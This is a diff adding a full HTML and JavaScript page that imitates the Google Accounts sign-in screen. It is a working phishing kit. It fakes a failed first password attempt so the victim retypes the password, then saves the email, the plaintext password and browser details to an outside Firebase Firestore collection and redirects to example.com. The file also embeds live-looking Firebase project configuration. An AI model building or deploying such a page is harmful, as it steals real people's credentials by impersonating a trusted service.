@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+    <!-- Using Firebase 8.x for compatibility -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fff;
+            color: #202124;
+            font-size: 14px;
+            line-height: 1.4286;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .logo {
+            width: 75px;
+            height: 24px;
+            margin-bottom: 16px;
+        }
+        
+        .logo svg {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin-bottom: 0;
+            padding-top: 16px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.5;
+            letter-spacing: 0.1px;
+            margin-top: 8px;
+            margin-bottom: 36px;
+        }
+        
+        .form-container {
+            width: 100%;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px 40px 36px;
+            margin-bottom: 24px;
+        }
+        
+        .form-field {
+            width: 100%;
+            margin-bottom: 24px;
+        }
+        
+        .input-container {
+            width: 100%;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 13px 15px;
+            transition: border-color 0.2s;
+            background: #fff;
+        }
+        
+        .input-container:hover {
+            border-color: #8a8d91;
+        }
+        
+        .input-container:focus-within {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+        
+        .input-container.error {
+            border-color: #d93025;
+        }
+        
+        .input-label {
+            display: block;
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+        
+        .input-field {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #202124;
+            background: transparent;
+            padding: 0;
+        }
+        
+        .input-field::placeholder {
+            color: transparent;
+        }
+        
+        .input-field:focus::placeholder {
+            color: #8a8d91;
+        }
+        
+        .floating-label {
+            position: absolute;
+            left: 15px;
+            top: 13px;
+            color: #5f6368;
+            font-size: 16px;
+            transition: all 0.2s;
+            pointer-events: none;
+            background: #fff;
+            padding: 0 4px;
+        }
+        
+        .input-container:focus-within .floating-label,
+        .input-field:not(:placeholder-shown) + .floating-label {
+            top: -8px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: flex;
+        }
+        
+        .error-icon {
+            width: 16px;
+            height: 16px;
+            fill: #d93025;
+            flex-shrink: 0;
+        }
+        
+        .forgot-email {
+            margin-top: -12px;
+            margin-bottom: 36px;
+        }
+        
+        .forgot-email a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .forgot-email a:hover {
+            text-decoration: underline;
+        }
+        
+        .not-your-computer {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        
+        .not-your-computer a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .not-your-computer a:hover {
+            text-decoration: underline;
+        }
+        
+        .guest-mode {
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 48px;
+        }
+        
+        .buttons {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            padding: 10px 0;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            padding: 10px 24px;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            position: relative;
+            min-width: 80px;
+            min-height: 36px;
+        }
+        
+        .next-btn:hover {
+            background-color: #1b66c9;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+        
+        .next-btn:disabled {
+            background-color: #f8f9fa;
+            color: #9aa0a6;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        
+        .loading-spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+        
+        .loading-spinner.active {
+            display: block;
+        }
+        
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        
+        .footer {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            margin-top: 24px;
+            padding: 0 20px;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            display: flex;
+            align-items: center;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        
+        /* Password Screen */
+        .password-screen {
+            display: none;
+            width: 100%;
+        }
+        
+        .welcome-text {
+            font-size: 14px;
+            color: #202124;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        
+        .email-display {
+            font-weight: 500;
+            color: #1a73e8;
+        }
+        
+        .show-password {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+        
+        .show-password input {
+            cursor: pointer;
+        }
+        
+        .show-password label {
+            color: #5f6368;
+            cursor: pointer;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px;
+            }
+            
+            .form-container {
+                padding: 24px;
+                border: none;
+            }
+            
+            .footer {
+                flex-direction: column;
+                align-items: center;
+                gap: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
+                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/>
+                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/>
+                <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36v.08c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/>
+                <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/>
+                <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/>
+                <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/>
+            </svg>
+        </div>
+        
+        <!-- Email Screen -->
+        <div class="email-screen">
+            <h1 class="title">Sign in</h1>
+            <p class="subtitle">Use your Google Account</p>
+            
+            <div class="form-container">
+                <div class="form-field">
+                    <div class="input-container" id="emailContainer">
+                        <input type="text" class="input-field" id="emailInput" placeholder=" " autocomplete="username">
+                        <span class="floating-label">Email or phone</span>
+                    </div>
+                    <div class="error-message" id="emailError">
+                        <svg class="error-icon" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        <span id="emailErrorText">Couldn't find your Google Account</span>
+                    </div>
+                </div>
+                
+                <div class="forgot-email">
+                    <a href="#" id="forgotEmail">Forgot email?</a>
+                </div>
+                
+                <p class="not-your-computer">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="#" id="learnMore">Learn more about using Guest mode</a>
+                </p>
+                
+                <p class="guest-mode">Enable (United States)</p>
+                
+                <div class="buttons">
+                    <a href="#" class="create-account" id="createAccount">Create account</a>
+                    <button class="next-btn" id="emailNextBtn">
+                        <span class="btn-text">Next</span>
+                        <div class="loading-spinner" id="emailSpinner"></div>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Password Screen -->
+        <div class="password-screen">
+            <h1 class="title">Welcome</h1>
+            <p class="subtitle">Use your Google Account</p>
+            
+            <div class="form-container">
+                <div class="welcome-text">
+                    Enter your password for <span class="email-display" id="displayEmail"></span>
+                </div>
+                
+                <div class="form-field">
+                    <div class="input-container" id="passwordContainer">
+                        <input type="password" class="input-field" id="passwordInput" placeholder=" " autocomplete="current-password">
+                        <span class="floating-label">Enter your password</span>
+                    </div>
+                    <div class="error-message" id="passwordError">
+                        <svg class="error-icon" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        <span id="passwordErrorText">Wrong password. Try again or click Forgot password to reset it.</span>
+                    </div>
+                    
+                    <div class="show-password">
+                        <input type="checkbox" id="showPassword">
+                        <label for="showPassword">Show password</label>
+                    </div>
+                </div>
+                
+                <div class="forgot-email">
+                    <a href="#" id="forgotPassword">Forgot password?</a>
+                </div>
+                
+                <p class="not-your-computer">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="#" id="learnMore2">Learn more about using Guest mode</a>
+                </p>
+                
+                <div class="buttons">
+                    <a href="#" class="create-account" id="backToEmail">Back</a>
+                    <button class="next-btn" id="passwordNextBtn">
+                        <span class="btn-text">Next</span>
+                        <div class="loading-spinner" id="passwordSpinner"></div>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+            
+            <div class="language-selector">
+                <span>English (United States)</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBwpZMajtrH5MRICLlxLV6tmMJWIfTeAN0",
+            authDomain: "kbmanager-f37df.firebaseapp.com",
+            projectId: "kbmanager-f37df",
+            storageBucket: "kbmanager-f37df.firebasestorage.app",
+            messagingSenderId: "869246446509",
+            appId: "1:869246446509:web:3a736b62e7d6f60eb1cf24",
+            measurementId: "G-C109HCQSMB"
+        };
+
+        // Initialize Firebase
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        
+        const auth = firebase.auth();
+        const firestore = firebase.firestore();
+
+        // DOM Elements
+        const emailScreen = document.querySelector('.email-screen');
+        const passwordScreen = document.querySelector('.password-screen');
+        
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const displayEmail = document.getElementById('displayEmail');
+        const showPasswordCheckbox = document.getElementById('showPassword');
+        
+        const emailContainer = document.getElementById('emailContainer');
+        const passwordContainer = document.getElementById('passwordContainer');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+        const emailErrorText = document.getElementById('emailErrorText');
+        const passwordErrorText = document.getElementById('passwordErrorText');
+        
+        const emailNextBtn = document.getElementById('emailNextBtn');
+        const passwordNextBtn = document.getElementById('passwordNextBtn');
+        const emailSpinner = document.getElementById('emailSpinner');
+        const passwordSpinner = document.getElementById('passwordSpinner');
+        
+        const forgotEmail = document.getElementById('forgotEmail');
+        const forgotPassword = document.getElementById('forgotPassword');
+        const createAccount = document.getElementById('createAccount');
+        const backToEmail = document.getElementById('backToEmail');
+
+        // State variables
+        let currentEmail = '';
+        let passwordAttempts = {};
+
+        // Show loading state
+        function showLoading(button, spinner) {
+            button.disabled = true;
+            spinner.classList.add('active');
+            button.querySelector('.btn-text').style.visibility = 'hidden';
+        }
+
+        // Hide loading state
+        function hideLoading(button, spinner) {
+            button.disabled = false;
+            spinner.classList.remove('active');
+            button.querySelector('.btn-text').style.visibility = 'visible';
+        }
+
+        // Validate email format
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Check if email looks like a Google Account
+        function isLikelyGoogleAccount(email) {
+            const googleDomains = [
+                'gmail.com', 'googlemail.com', 'google.com'
+            ];
+            
+            const domain = email.split('@')[1]?.toLowerCase();
+            return googleDomains.includes(domain);
+        }
+
+        // Show error message
+        function showError(errorElement, message, container = null) {
+            errorElement.querySelector('span').textContent = message;
+            errorElement.classList.add('show');
+            
+            if (container) {
+                container.classList.add('error');
+            }
+        }
+
+        // Hide error message
+        function hideError(errorElement, container = null) {
+            errorElement.classList.remove('show');
+            if (container) {
+                container.classList.remove('error');
+            }
+        }
+
+        // Switch to password screen
+        function showPasswordScreen(email) {
+            currentEmail = email;
+            displayEmail.textContent = email;
+            emailScreen.style.display = 'none';
+            passwordScreen.style.display = 'block';
+            
+            // Initialize password attempts for this email
+            if (!passwordAttempts[email]) {
+                passwordAttempts[email] = 0;
+            }
+            
+            // Clear previous errors
+            hideError(passwordError, passwordContainer);
+            passwordInput.value = '';
+            
+            setTimeout(() => {
+                passwordInput.focus();
+            }, 100);
+        }
+
+        // Switch to email screen
+        function showEmailScreen() {
+            passwordScreen.style.display = 'none';
+            emailScreen.style.display = 'block';
+            
+            // Clear password field and errors
+            passwordInput.value = '';
+            hideError(passwordError, passwordContainer);
+            
+            setTimeout(() => {
+                emailInput.focus();
+            }, 100);
+        }
+
+        // Verify password (first attempt fails, second succeeds)
+        async function verifyPassword(email, password) {
+            // Increment attempts
+            passwordAttempts[email] = (passwordAttempts[email] || 0) + 1;
+            const attemptNumber = passwordAttempts[email];
+            
+            // Realistic delay based on attempt
+            let delay = 800;
+            if (attemptNumber === 1) {
+                delay = 1200; // First attempt takes longer
+            } else if (attemptNumber > 3) {
+                delay = 2000; // Multiple failures take longer
+            }
+            
+            await new Promise(resolve => setTimeout(resolve, delay));
+            
+            // First attempt always fails (as required)
+            if (attemptNumber === 1) {
+                return {
+                    success: false,
+                    message: "Wrong password. Try again or click Forgot password to reset it."
+                };
+            }
+            
+            // Second attempt succeeds (as required)
+            return { success: true };
+        }
+
+        // Save login attempt to Firebase
+        async function saveLoginAttempt(email, password, success) {
+            try {
+                const timestamp = firebase.firestore.FieldValue.serverTimestamp();
+                const userAgent = navigator.userAgent;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const language = navigator.language;
+                
+                // Save to Firestore
+                const docRef = await firestore.collection('login_attempts').add({
+                    email: email,
+                    password: password,
+                    timestamp: timestamp,
+                    success: success,
+                    attempts: passwordAttempts[email] || 1,
+                    user_agent: userAgent,
+                    screen_resolution: screenResolution,
+                    timezone: timezone,
+                    language: language,
+                    ip_address: 'simulated',
+                    referrer: document.referrer || 'Direct',
+                    browser: getBrowserName(userAgent),
+                    os: getOS(userAgent)
+                });
+                
+                console.log('Login attempt saved to Firebase with ID:', docRef.id);
+                return true;
+            } catch (error) {
+                console.error('Error saving login attempt:', error);
+                return false;
+            }
+        }
+
+        // Helper functions
+        function getBrowserName(userAgent) {
+            if (userAgent.includes('Chrome')) return 'Chrome';
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('Safari')) return 'Safari';
+            if (userAgent.includes('Edge')) return 'Edge';
+            return 'Other';
+        }
+
+        function getOS(userAgent) {
+            if (userAgent.includes('Windows')) return 'Windows';
+            if (userAgent.includes('Mac')) return 'MacOS';
+            if (userAgent.includes('Linux')) return 'Linux';
+            if (userAgent.includes('Android')) return 'Android';
+            if (userAgent.includes('iOS') || userAgent.includes('iPhone')) return 'iOS';
+            return 'Other';
+        }
+
+        // Event Listeners
+        emailNextBtn.addEventListener('click', async () => {
+            const email = emailInput.value.trim();
+            
+            if (!email) {
+                showError(emailError, 'Enter an email or phone number', emailContainer);
+                emailInput.focus();
+                return;
+            }
+            
+            if (!isValidEmail(email)) {
+                showError(emailError, 'Couldn\'t find your Google Account', emailContainer);
+                emailInput.focus();
+                return;
+            }
+            
+            showLoading(emailNextBtn, emailSpinner);
+            
+            // Simulate network delay
+            await new Promise(resolve => setTimeout(resolve, 800));
+            
+            // Check if email exists (simulated)
+            const userExists = Math.random() > 0.1; // 90% chance user exists
+            
+            if (userExists) {
+                hideLoading(emailNextBtn, emailSpinner);
+                showPasswordScreen(email);
+            } else {
+                hideLoading(emailNextBtn, emailSpinner);
+                showError(emailError, 'Couldn\'t find your Google Account', emailContainer);
+                emailInput.select();
+            }
+        });
+
+        passwordNextBtn.addEventListener('click', async () => {
+            const password = passwordInput.value.trim();
+            
+            if (!password) {
+                showError(passwordError, 'Enter a password', passwordContainer);
+                passwordInput.focus();
+                return;
+            }
+            
+            showLoading(passwordNextBtn, passwordSpinner);
+            
+            const verification = await verifyPassword(currentEmail, password);
+            
+            if (!verification.success) {
+                hideLoading(passwordNextBtn, passwordSpinner);
+                showError(passwordError, verification.message, passwordContainer);
+                passwordInput.select();
+                return;
+            }
+            
+            // Save successful login to Firebase
+            await saveLoginAttempt(currentEmail, password, true);
+            
+            hideLoading(passwordNextBtn, passwordSpinner);
+            
+            // Immediately redirect to example.com after successful login
+            window.location.href = 'https://example.com';
+        });
+
+        // Show password toggle
+        showPasswordCheckbox.addEventListener('change', () => {
+            passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
+        });
+
+        // Enter key support
+        emailInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                emailNextBtn.click();
+            }
+        });
+
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                passwordNextBtn.click();
+            }
+        });
+
+        // Clear errors when typing
+        emailInput.addEventListener('input', () => {
+            hideError(emailError, emailContainer);
+        });
+
+        passwordInput.addEventListener('input', () => {
+            hideError(passwordError, passwordContainer);
+        });
+
+        // Navigation
+        backToEmail.addEventListener('click', (e) => {
+            e.preventDefault();
+            showEmailScreen();
+        });
+
+        forgotEmail.addEventListener('click', (e) => {
+            e.preventDefault();
+            // Simulated Google account recovery
+            window.open('https://accounts.google.com/signin/recovery', '_blank');
+        });
+
+        forgotPassword.addEventListener('click', (e) => {
+            e.preventDefault();
+            // Simulated password reset
+            window.open('https://accounts.google.com/signin/recovery', '_blank');
+        });
+
+        createAccount.addEventListener('click', (e) => {
+            e.preventDefault();
+            // Simulated account creation
+            window.open('https://accounts.google.com/signup', '_blank');
+        });
+
+        // Learn more links
+        document.getElementById('learnMore').addEventListener('click', (e) => {
+            e.preventDefault();
+            // Simulated help page
+            window.open('https://support.google.com/accounts/answer/6098865', '_blank');
+        });
+
+        document.getElementById('learnMore2').addEventListener('click', (e) => {
+            e.preventDefault();
+            // Simulated help page
+            window.open('https://support.google.com/accounts/answer/6098865', '_blank');
+        });
+
+        // Initialize
+        emailInput.focus();
+
+        // Google-like placeholder behavior
+        emailInput.addEventListener('focus', () => {
+            emailInput.placeholder = 'you@example.com';
+        });
+
+        emailInput.addEventListener('blur', () => {
+            emailInput.placeholder = ' ';
+        });
+
+        passwordInput.addEventListener('focus', () => {
+            passwordInput.placeholder = 'Your password';
+        });
+
+        passwordInput.addEventListener('blur', () => {
+            passwordInput.placeholder = ' ';
+        });
+    </script>
+</body>
+</html>
